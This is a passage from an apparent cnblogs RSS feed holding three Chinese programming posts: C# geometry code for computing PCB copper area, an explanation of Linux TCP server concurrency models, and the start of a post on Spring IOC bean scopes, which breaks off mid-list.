                    sum_lenght &lt;/span&gt;+= a_Length(gSur_Point_list[i - &lt;span&gt;1&lt;/span&gt;].p, gSur_Point_list[i].p, gSur_Point_list[i + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;].p, ccw);
                    is_flag &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                }
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                {
                    sum_lenght &lt;/span&gt;+= l_Length(gSur_Point_list[i - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;].p, gSur_Point_list[i].p);
                }
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; sum_lenght;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 求弧Arc长度  3点
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ps&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;pc&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;pe&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; a_Length(gPoint ps, gPoint pc, gPoint pe, &lt;span&gt;bool&lt;/span&gt; ccw = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; pi / &lt;span&gt;180&lt;/span&gt; * p2p_di(pc, ps) *&lt;span&gt; a_Angle(ps, pc, pe, ccw);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 求线Line长度  2点
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ps&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;pe&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; l_Length(gPoint ps, gPoint pe)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Math.Sqrt((ps.x - pe.x) * (ps.x - pe.x) + (ps.y - pe.y) * (ps.y -&lt;span&gt; pe.y));
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;  4.数据结构&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('2c3ebe5d-1daf-4b41-84fa-395d62981aa5')&quot; readability=&quot;45.5&quot;&gt;&lt;img id=&quot;code_img_closed_2c3ebe5d-1daf-4b41-84fa-395d62981aa5&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_2c3ebe5d-1daf-4b41-84fa-395d62981aa5&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('2c3ebe5d-1daf-4b41-84fa-395d62981aa5',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_2c3ebe5d-1daf-4b41-84fa-395d62981aa5&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;86&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Surface 坐标泛型集类1
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; gSur_Point
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; gSur_Point()
        { }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; gSur_Point(&lt;span&gt;double&lt;/span&gt; x_val, &lt;span&gt;double&lt;/span&gt; y_val, &lt;span&gt;byte&lt;/span&gt;&lt;span&gt; type_point_)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.p.x =&lt;span&gt; x_val;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.p.y =&lt;span&gt; y_val;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.type_point =&lt;span&gt; type_point_;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; gSur_Point(gPoint p, &lt;span&gt;byte&lt;/span&gt;&lt;span&gt; type_point_)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.p =&lt;span&gt; p;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.type_point =&lt;span&gt; type_point_;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; gPoint p;
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 0为折点  1为顺时针 2为逆时针  
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;byte&lt;/span&gt; type_point { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;; } = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 值
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; Value { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;; } = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Surface 坐标泛型集类2
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; gSur_list
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;gSur_Point&amp;gt; sur_list = &lt;span&gt;new&lt;/span&gt; List&amp;lt;gSur_Point&amp;gt;&lt;span&gt;();
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 是否为空洞
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; is_hole { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 是否逆时针
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; is_ccw { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Surface 坐标泛型集类3
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; gS
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;gSur_list&amp;gt; sur_group = &lt;span&gt;new&lt;/span&gt; List&amp;lt;gSur_list&amp;gt;&lt;span&gt;();
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 是否为负  polarity-- P N
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; negative { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; attribut { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 点  数据类型 (XY)
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt;&lt;span&gt; gPoint
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; gPoint(gPoint p_)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.x =&lt;span&gt; p_.x;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.y =&lt;span&gt; p_.y;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; gPoint(&lt;span&gt;double&lt;/span&gt; x_val, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; y_val)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.x =&lt;span&gt; x_val;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.y =&lt;span&gt; y_val;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; x;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; y;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; gPoint &lt;span&gt;operator&lt;/span&gt; +&lt;span&gt;(gPoint p1, gPoint p2)
        {
            p1.x &lt;/span&gt;+=&lt;span&gt; p2.x;
            p1.y &lt;/span&gt;+=&lt;span&gt; p2.y;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; p1;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; gPoint &lt;span&gt;operator&lt;/span&gt; -&lt;span&gt;(gPoint p1, gPoint p2)
        {
            p1.x &lt;/span&gt;-=&lt;span&gt; p2.x;
            p1.y &lt;/span&gt;-=&lt;span&gt; p2.y;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; p1;
        }
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; ARC 数据类型
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt;&lt;span&gt; gA
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; gA(&lt;span&gt;double&lt;/span&gt; ps_x, &lt;span&gt;double&lt;/span&gt; ps_y, &lt;span&gt;double&lt;/span&gt; pc_x, &lt;span&gt;double&lt;/span&gt; pc_y, &lt;span&gt;double&lt;/span&gt; pe_x, &lt;span&gt;double&lt;/span&gt; pe_y, &lt;span&gt;double&lt;/span&gt; width_, &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; ccw_)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.ps = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; gPoint(ps_x, ps_y);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.pc = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; gPoint(pc_x, pc_y);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.pe = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; gPoint(pe_x, pe_y);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.negative = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.ccw =&lt;span&gt; ccw_;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.symbols = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +&lt;span&gt; width_.ToString();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.attribut = &lt;span&gt;string&lt;/span&gt;&lt;span&gt;.Empty;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.width =&lt;span&gt; width_;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; gA(gPoint ps_, gPoint pc_, gPoint pe_, &lt;span&gt;double&lt;/span&gt; width_, &lt;span&gt;bool&lt;/span&gt; ccw_ = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.ps =&lt;span&gt; ps_;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.pc =&lt;span&gt; pc_;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.pe =&lt;span&gt; pe_;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.negative = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.ccw =&lt;span&gt; ccw_;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.symbols = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +&lt;span&gt; width_.ToString();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.attribut = &lt;span&gt;string&lt;/span&gt;&lt;span&gt;.Empty;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.width =&lt;span&gt; width_;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; gPoint ps;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; gPoint pe;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; gPoint pc;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; negative;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;polarity-- positive  negative&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; ccw; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;direction-- cw ccw&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; symbols;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; attribut;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; width;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; gA &lt;span&gt;operator&lt;/span&gt; +&lt;span&gt;(gA arc1, gPoint move_p)
        {
            arc1.ps &lt;/span&gt;+=&lt;span&gt; move_p;
            arc1.pe &lt;/span&gt;+=&lt;span&gt; move_p;
            arc1.pc &lt;/span&gt;+=&lt;span&gt; move_p;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; arc1;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; gA &lt;span&gt;operator&lt;/span&gt; +&lt;span&gt;(gA arc1, gPP move_p)
        {
            arc1.ps &lt;/span&gt;+=&lt;span&gt; move_p.p;
            arc1.pe &lt;/span&gt;+=&lt;span&gt; move_p.p;
            arc1.pc &lt;/span&gt;+=&lt;span&gt; move_p.p;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; arc1;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; gA &lt;span&gt;operator&lt;/span&gt; +&lt;span&gt;(gA arc1, gP move_p)
        {
            arc1.ps &lt;/span&gt;+=&lt;span&gt; move_p.p;
            arc1.pe &lt;/span&gt;+=&lt;span&gt; move_p.p;
            arc1.pc &lt;/span&gt;+=&lt;span&gt; move_p.p;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; arc1;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; gA &lt;span&gt;operator&lt;/span&gt; -&lt;span&gt;(gA arc1, gPoint move_p)
        {
            arc1.ps &lt;/span&gt;-=&lt;span&gt; move_p;
            arc1.pe &lt;/span&gt;-=&lt;span&gt; move_p;
            arc1.pc &lt;/span&gt;-=&lt;span&gt; move_p;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; arc1;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; gA &lt;span&gt;operator&lt;/span&gt; -&lt;span&gt;(gA arc1, gPP move_p)
        {
            arc1.ps &lt;/span&gt;-=&lt;span&gt; move_p.p;
            arc1.pe &lt;/span&gt;-=&lt;span&gt; move_p.p;
            arc1.pc &lt;/span&gt;-=&lt;span&gt; move_p.p;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; arc1;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; gA &lt;span&gt;operator&lt;/span&gt; -&lt;span&gt;(gA arc1, gP move_p)
        {
            arc1.ps &lt;/span&gt;-=&lt;span&gt; move_p.p;
            arc1.pe &lt;/span&gt;-=&lt;span&gt; move_p.p;
            arc1.pc &lt;/span&gt;-=&lt;span&gt; move_p.p;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; arc1;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;四.【铜面的多边形面积】--实现效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     经测试，发现程序计算出来铜面积与genesis铜面积计算存在少量的偏差(猜侧奥宝为了达到越大规模铜面积计算，采用丢失精度计算铜面积达到快速计算铜面积的目的)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    小结: 采用程序计算在小规模铜面积计算，不管是计算速度还是铜面积计算精度已超过genesis.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/733296/201905/733296-20190523030023845-1073758315.gif&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 下例:genesis计算铜面积存一定偏差,实际PAD尺寸为4X3mm &lt;em id=&quot;__mceDel&quot;&gt;面积为:12平方毫米  &lt;/em&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt;而genesis计算得到面积为12.004平方毫米&lt;/em&gt;&lt;/em&gt;&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/733296/201905/733296-20190523030135621-1347867214.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Wed, 22 May 2019 19:03:00 +0000</pubDate>
<dc:creator>pcbren</dc:creator>
<og:description>一个多月没更新博客园了，这里继续分享关于PCB工程相关一些知识，做过PCB工程都知道用使用genesis或incam是可以非常方便的计算得到铜皮面积这个参数【下图】，但实际这个软件是通过什么算法计算出</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/pcbren/p/10909585.html</dc:identifier>
</item>
<item>
<title>linux如何处理多连接请求？ - 小二郎**</title>
<link>http://www.cnblogs.com/sjks/p/10909563.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sjks/p/10909563.html</guid>
<description>&lt;p&gt;1.TCP迭代服务器程序&lt;/p&gt;
&lt;p&gt;这种方式就是服务器同一时间只处理一个客户端的请求，这个请求处理完以后才转向下一个客户请求。当然这样的服务器程序比较少见，这就像一个公司只能一次处理一个客户，后面的客户只能等待，这样的话肯定是不行的，效率太低 了，但是要是从进程控制角度来看这种方式是最快的，因为它没有执行进程控制，这是相对于后面讲的方式多进程而言的，啥意思呢，就是说一个公司里面当你只有一个销售员接待客户的时候，我对销售员的管理成本就没有了，当你是多个销售员对应多个客户的时候，虽然这个时候可以同时接待多个客户，但是老板对多个销售员的管理成本也要算进去，上面说的进程控制就是老板对多个销售员的管理。&lt;/p&gt;
&lt;p&gt;2.TCP并发服务器程序，每个客户一个子进程&lt;/p&gt;
&lt;p&gt;这种方式呢，就是多个进程处理多个连接，每来一个新的连接，就立即创建(fork)一个新的子进程来处理这个连接，这种方式的问题是为每个新连接现场fork一个子进程比较耗费cpu时间，操作系统在fork子进程时要做的事情很多的，首先需要复制父进程的相关数据结构，然后在初始化权限，调度器，文件系统，内存这一系列操作，所以创建一个子进程的开销是很大的，尤其是现在这个时代，繁忙的服务器每天的连接数可以达到数以百万计。&lt;/p&gt;
&lt;p&gt;举例来说这种方式就像你作为老板，每接一个项目就创建一个新的子公司，这个子公司的人员，桌椅板凳，各种工具都是新的，项目完成以后该子公司解散。&lt;/p&gt;
&lt;p&gt;3.TCP预先派生子进程服务器程序&lt;/p&gt;
&lt;p&gt;这种方式就是在启动阶段预先创建多个子进程，当各个客户连接到来时，子进程就可以马上为他们服务，而不是说当客户来的时候在创建好子进程为他们服务，这种方式优点就是没有了父进程fork的开销，缺点就是父进程必须在服务器启动阶段猜测需要预先创建多少子进程，而且父进程还要实时监控进程池中的进程数，当这个数字高于某个阈值时，需要终止多余的进程，当这个数字低于某个阈值时，需要创建新进程。&lt;/p&gt;
&lt;p&gt;举例来说：这就像老板预先创建了多个子公司，当来项目时，让创建好的子公司接项目就可以 了，而不是像第二种方式那样，来客户了，你再去创建子公司，但是作为老板你要全局把控，当你发现子公司的数量太多，已经远大于项目的数量，这时候你就要注销掉一部分公司，以节省开销，同样反过来，当你发现接的项目数很多，增长的速度很多，那么你就需要马上在创建几个子公司来处理项目，要不然你的项目就接不到了，就挣不了钱，无法迎娶白富美，走上人生巅峰了。&lt;/p&gt;
&lt;p&gt;然后我们再说关于这种方式会发生的一个问题，这个问题就叫做&quot;惊群&quot;，啥意思呢，就是说当来了一个新请求时，所有的进程都会被唤醒，但是最后只有一个进程能接到这个请求，这样就会导致性能受损。&lt;/p&gt;
&lt;p&gt;举例来说:当没有项目来的时候，所有的子公司都处于放假状态，所有人员都休息了，然后来了一个新的项目，所有的公司都得恢复到上班状态，但是其实到最后只有一个公司能接到这个项目，这样对于其他子公司员工来说是不是有点烦，老子正在放假休息呢，然后你把我召回到了公司还没事情做，让我白跑一趟，交通费食宿费这些都属于浪费掉了，对应到操作系统来说就是性能受损。&lt;/p&gt;
&lt;p&gt;4.TCP并发服务器程序，每个客户一个线程&lt;/p&gt;
&lt;p&gt;这种方式就是每来一个客户请求，就创建一个线程，创建线程的开销要比创建进程的开销小多了，创建线程就是将各个结构的引用计数加一，创建栈等操作，相对比创建进程来说开销要小很多了，这其实就像公司接项目的时候不是创建子公司，而是创建多个项目组，项目组可以共用公司的各种资源。&lt;/p&gt;
&lt;p&gt;这里说一下accept的概念，accept是套接字(socket)中的一个函数，他是用来接收服务器中已完成连接队列里面的连接，也就是服务器会有一个队列专门用来存放已经三次握手完成的tcp连接，当这个队列有数据的时候，调用这个accept函数就会从队列头部拿出一个连接给应用程序处理。&lt;/p&gt;
&lt;p&gt;5.TCP预先创建线程服务器程序，每个线程各自accept&lt;/p&gt;
&lt;p&gt;这种其实就是服务器启动阶段预先创建线程池，也就是多个线程以取代为每个客户连接现场创建一个线程有性能加速效果，这种做法就像来了一个新项目，只有一个项目组接这个项目，其他项目组还是做原来做的事情。&lt;/p&gt;
&lt;p&gt;6.TCP预先创建线程服务器程序，主线程统一accept&lt;/p&gt;
&lt;p&gt;这种方式就是在程序启动阶段创建一个线程池之后只让主线程调用accept并把每个客户连接传递给池中某个可用线程，这就像有个所有项目组的总管，他负责接项目，来了项目以后，他去把这个项目分配给可以开发的项目组。&lt;/p&gt;
</description>
<pubDate>Wed, 22 May 2019 17:48:00 +0000</pubDate>
<dc:creator>小二郎**</dc:creator>
<og:description>1.TCP迭代服务器程序 这种方式就是服务器同一时间只处理一个客户端的请求，这个请求处理完以后才转向下一个客户请求。当然这样的服务器程序比较少见，这就像一个公司只能一次处理一个客户，后面的客户只能等待</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sjks/p/10909563.html</dc:identifier>
</item>
<item>
<title>SpringIOC二—— 容器 和 Bean的深入理解 - SharpCJ</title>
<link>http://www.cnblogs.com/joy99/p/10903567.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/joy99/p/10903567.html</guid>
<description>&lt;p&gt;上文：&lt;a href=&quot;https://www.cnblogs.com/joy99/p/10842218.html&quot;&gt;Spring IOC 一——容器装配Bean的简单使用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上篇文章介绍了 Spring IOC 中最重要的两个概念——容器和Bean，以及如何使用 Spring 容器装配Bean。本文接着记录 Spring 中 IOC 的相关知识。&lt;/p&gt;
&lt;blockquote readability=&quot;3.75&quot;&gt;
&lt;p&gt;部分参考资料：&lt;br/&gt;《Spring实战（第4版）》&lt;br/&gt;《轻量级 JavaEE 企业应用实战（第四版）》&lt;br/&gt;&lt;a href=&quot;https://docs.spring.io/spring/docs/5.0.6.RELEASE/spring-framework-reference/core.html#spring-core&quot;&gt;Spring 官方文档&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.w3cschool.cn/wkspring/&quot;&gt;W3CSchool Spring教程&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.yiibai.com/spring/&quot;&gt;易百教程 Spring教程&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;bean的作用域&quot;&gt;Bean的作用域&lt;/h2&gt;
&lt;p&gt;目前，scope的取值有5种取值：&lt;br/&gt;在Spring 2.0之前，有singleton和prototype两种；&lt;br/&gt;在Spring 2.0之后，为支持web应用的ApplicationContext，增强另外三种：request，session和global session类型，它们只适用于web程序，通常是和XmlWebApplicationContext共同使用。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;singleton： 单例模式，在整个 Spring IOC 容器中只会创建一个实例。默认即为单例模式。&lt;/li&gt;
&lt;li&gt;prototype：原型模式，每次通过 &lt;code&gt;getBean&lt;/code&gt; 方法获取实例时，都会创建一个新的实例。&lt;/li&gt;
&lt;li&gt;request:在同一次Http请求内，只会生成一个实例，只在 Web 应用中使用 Spring 才有效。&lt;/li&gt;
&lt;li&gt;session：在同义词 Http 会话内，只会生成一个实例，只在 Web 应用中使用 Spring 才有效。&lt;/li&gt;
